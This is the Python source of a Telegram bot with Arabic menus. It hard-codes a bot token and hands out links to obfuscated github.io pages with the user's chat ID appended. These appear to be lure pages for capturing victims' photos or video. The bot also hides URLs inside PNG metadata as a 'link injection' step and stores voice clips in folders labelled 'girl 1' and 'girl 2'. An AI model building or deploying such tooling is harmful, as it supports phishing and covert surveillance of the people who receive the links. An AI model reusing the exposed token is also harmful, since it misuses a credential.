import os
import json
import telebot
from telebot import types
import threading
import http.server
import yt_dlp
from PIL import Image, PngImagePlugin

# الإعدادات
BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)
DB_FILE = "/tmp/voice_db.json"

PHOTO_LINK = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_LINK = "https://app-display.github.io/ca.html-chatId"
EDIT_LINK = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}
user_data = {}

# --- السيرفر للحماية ---
def run_dummy_server():
    try:
        port = int(os.environ.get("PORT", 8080))
        http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler).serve_forever()
    except: pass
threading.Thread(target=run_dummy_server, daemon=True).start()

# --- البيانات ---
def load_db():
    if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {"girl_1": {}, "girl_2": {}}

def save_db(db):
    with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(db, f, indent=4, ensure_ascii=False)

# --- تحميل الفيديو ---
def download_video_sync(url, chat_id):
    try:
        ydl_opts = {'format': 'best[ext=mp4]/best', 'outtmpl': f'/tmp/vid_{chat_id}.mp4', 'quiet': True}
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            return f'/tmp/vid_{chat_id}.mp4', info.get('title', 'Video')
    except Exception as e: return None, str(e)

# --- الحقن في الميتاداتا ---
def hide_link_in_metadata(img_path, link, out_path):
    img = Image.open(img_path).convert("RGB")
    meta = PngImagePlugin.PngInfo()
    meta.add_text("URL_LINK", link)
    img.save(out_path, "PNG", pnginfo=meta)

@bot.message_handler(commands=['start'])
def start(m):
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="p_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="v_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="e_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_mode"),
        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="v_menu")
    )
    bot.send_message(m.chat.id, "🤖 أهلاً بك سيف، القائمة الرئيسية:", reply_markup=kb)

@bot.callback_query_handler(func=lambda c: True)
def query(c):
    cid = c.message.chat.id
    if c.data == "dl_mode":
        user_states[cid] = "dl"
        bot.edit_message_text("أرسل الرابط الآن:", cid, c.message.message_id)
    elif c.data == "v_menu":
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("الفتاة 1", callback_data="g1_show"), types.InlineKeyboardButton("الفتاة 2", callback_data="g2_show"))
        bot.edit_message_text("اختر المجلد:", cid, c.message.message_id, reply_markup=kb)
    elif c.data in ["g1_show", "g2_show"]:
        user_states[cid] = c.data
        db = load_db()
        target = "girl_1" if "g1" in c.data else "girl_2"
        max_n = 10 if target == "girl_1" else 13
        kb = types.InlineKeyboardMarkup(row_width=2)
        for i in range(1, max_n + 1):
            name = f"مقطع {i}"
            emoji = "🎵" if name in db[target] else "⚪"
            kb.add(types.InlineKeyboardButton(f"{emoji} {name}", callback_data=f"play:{target}:{name}"))
        bot.edit_message_text(f"مجلد {target} (أرسل فويس للتحديث):", cid, c.message.message_id, reply_markup=kb)
    elif c.data.startswith("play:"):
        _, target, name = c.data.split(":")
        db = load_db()
        if db[target].get(name): bot.send_voice(cid, db[target][name])
        else: bot.answer_callback_query(c.id, "❌ فارغ!")
    elif c.data == "inject_start":
        user_states[cid] = "inject_img"
        bot.send_message(cid, "📸 أرسل الصورة:")
    elif c.data in ["p_link", "v_link", "e_link"]:
        links = {"p_link": PHOTO_LINK, "v_link": VIDEO_LINK, "e_link": EDIT_LINK}
        bot.send_message(cid, f"الرابط: {links[c.data]}?chatId={cid}")
    bot.answer_callback_query(c.id)

@bot.message_handler(content_types=['voice', 'text', 'photo'])
def msg(m):
    cid = m.chat.id
    if user_states.get(cid) == "dl":
        s = bot.reply_to(m, "⏳ جاري التحميل...")
        path, title = download_video_sync(m.text, cid)
        if path:
            bot.send_video(cid, open(path, 'rb'), caption=title)
            bot.delete_message(cid, s.message_id)
            os.remove(path)
        else: bot.edit_message_text(f"❌ فشل: {title}", cid, s.message_id)
        user_states[cid] = None
    elif m.voice and "g" in str(user_states.get(cid)):
        db = load_db()
        target = "girl_1" if "g1" in user_states[cid] else "girl_2"
        idx = len(db[target]) + 1
        db[target][f"مقطع {idx}"] = m.voice.file_id
        save_db(db)
        bot.reply_to(m, f"✅ تم حفظ المقطع {idx} في {target}")
    elif m.photo and user_states.get(cid) == "inject_img":
        user_data[cid] = {"img": bot.download_file(bot.get_file(m.photo[-1].file_id).file_path)}
        user_states[cid] = "inject_link"
        bot.reply_to(m, "تم حفظ الصورة، أرسل الرابط:")
    elif m.text and user_states.get(cid) == "inject_link":
        with open(f"/tmp/in_{cid}.png", "wb") as f: f.write(user_data[cid]["img"])
        hide_link_in_metadata(f"/tmp/in_{cid}.png", m.text, f"/tmp/out_{cid}.png")
        bot.send_photo(cid, open(f"/tmp/out_{cid}.png", "rb"), caption="✅ تم الحقن!")
        user_states[cid] = None

bot.polling(none_stop=True)
